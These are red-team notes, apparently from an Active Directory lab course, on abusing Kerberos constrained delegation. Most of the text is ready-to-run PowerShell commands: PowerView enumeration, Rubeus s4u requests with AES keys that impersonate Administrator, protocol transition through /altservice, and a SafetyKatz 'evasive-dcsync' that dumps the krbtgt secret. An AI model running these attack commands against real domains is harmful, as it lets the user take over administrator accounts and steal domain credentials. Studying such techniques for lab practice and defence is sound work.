To abuse constrained delegation in above scenario, we need to have access to the websvc account. If we have access to that account, it is possible to access the services listed in `msDS-AllowedToDelegateTo` of the `websvc` (web service on web server) account as **ANY user**

Find users and computers with constrained delegation enabled (PowerView + AD Module)
```powershell
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth

Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne
"$null"} -Properties msDS-AllowedToDelegateTo
```

**COMPROMISE THE WEB SERVICE ACCOUNT AND RUN THE FOLLOWING AS IT**

Request a `TGT` and `TGS` and impersonate any user
```powershell
C:\Users\Public\Loader.exe -path C:\Users\Public\Rubeus.exe -args s4u /user:websvc /aes256:2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e879470ade07e5412d7 /impersonateuser:Administrator /msdsspn:"CIFS/mgmtsrv.tech.finance.corp" /ptt
```

Test
```powershell
dir \\dcorp-mssql.dollarcorp.moneycorp.local\c$
```

 
> [!NOTE] **NOTE**
> You can edit what services the machine/user account can access if you have `GenericAll/Write` rights to the first hop

#### Protocol Transition
We can change the protocol/service being accessed for the SPN. This is due to the SPN in the TGS being in clear-text and user editable.

**FOR MACHINE ACCOUNT AES KEYS ALWAYS USE THE ONE WHERE THE SID IS `S-1-5-18` AKA THE LAST ONE IN A LSADUMP**

Rubeus and the `/altservice` parameter
> **Note:** Change to `altservice` to `ldap` to run dcsync
```powershell
C:\Users\Public\Loader.exe -path C:\Users\Public\Rubeus.exe -args s4u /user:dcorp-adminsrv$ /aes256:e9513a0ac270264bb12fb3b3ff37d7244877d269a97c7b3ebc3f6f78c382eb51 /impersonateuser:Administrator /msdsspn:"CIFS/mgmtsrv.tech.finance.corp" /altservice:http /ptt
```

Now run a DCSync 
```powershell
.\Loader.exe -path .\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"
```